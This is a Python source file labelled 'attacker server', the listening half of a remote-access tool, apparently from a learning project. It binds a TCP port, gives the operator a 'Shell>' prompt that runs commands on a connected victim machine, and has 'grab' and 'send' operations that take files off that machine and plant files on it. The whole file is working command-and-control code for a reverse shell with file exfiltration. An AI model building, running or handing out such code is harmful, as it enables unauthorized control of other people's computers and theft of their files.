# attacker server
#TCP
#Change directory
#TCP bi-directional data transfer

import os
import socket

ip = "0.0.0.0"
port = 8080

def doGrab(conn, command, operation):
    conn.send(command.encode())

    # For grab operation, open a file in write mode, inside GrabbedFiles folder
    # File name should be of format: grabbed_sourceFilePathOfClientMachine
    # File name example: grabbed_C:/Users/John/Desktop/audit.docx
    # grab*C:\Users\user\Desktop\file.txt
    if (operation == "grab"):
        grab, sourcePathAsFileName = command.split("*")
        path = "/GrabbedFiles/"
        sourcePathAsFileName
        fileName = "grabbed_" + sourcePathAsFileName.replace("/", "-")

        # transfer the grabbed file to the server
        f = open(path + fileName, 'wb')
        while True:
            bits = conn.recv(5000)
            if bits.endswith('DONE'.encode()):  # Client.py appends 'DONE' to end of file.
                f.write(bits[:-4])  # Write those last received bits without the word 'DONE'
                f.close()
                print('[+] Transfer completed')
                break
            if 'File not found'.encode() in bits:
                f.close()  # Not in directions
                print('[-] Unable to find out the file')
                break
            f.write(bits)
        print("File name: " + fileName)
        print("Written to: " + path)

def doSend(conn, sourcePath, destinationPath, fileName):

    # For 'send' operation, open the file in the read mode
    # Read the file into packets and send them through connection object
    # After finished sending the whole file, send string 'DONE' to indicate the completion
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, 'rb')
        packet = sourceFile.read(5000)
        while len(packet) >0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send('DONE'.encode())
        print('[+] Transfer Completed')
    else:
        conn.send('File not found'.encode())
        print('[-] Unable to find the file')

def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.bind((ip, port))
    s.listen(1)
    print("=" * 60)
    print("TCP DATA INFILTRATION AND EXFILTRATION")
    print("=" * 60)
    print('[+] Listening for income TCP connection on port', port)
    conn, addr = s.accept()
    print('[+] We got a connection from', addr)

    while True:
        print("=" * 60)
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break

        #command format: grab*<File Path>
        #example: grab*C:\Users\John\Desktop\photo.jpeg
        elif 'grab' in command:
          doGrab(conn, command, "grab")

        #command format: send*<destination path>*<File Name>
        #example: send*C:\Users\John\Desktop\*photo.jpeg
        #source file in Linux. Example: /root/Desktop
        elif 'send' in command:
            sendCmd, destination, fileName = command.split("*")
            source = input("Source path: ")
            conn.send(command.encode())
            doSend(conn, source, destination, fileName)

        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connect()

main()
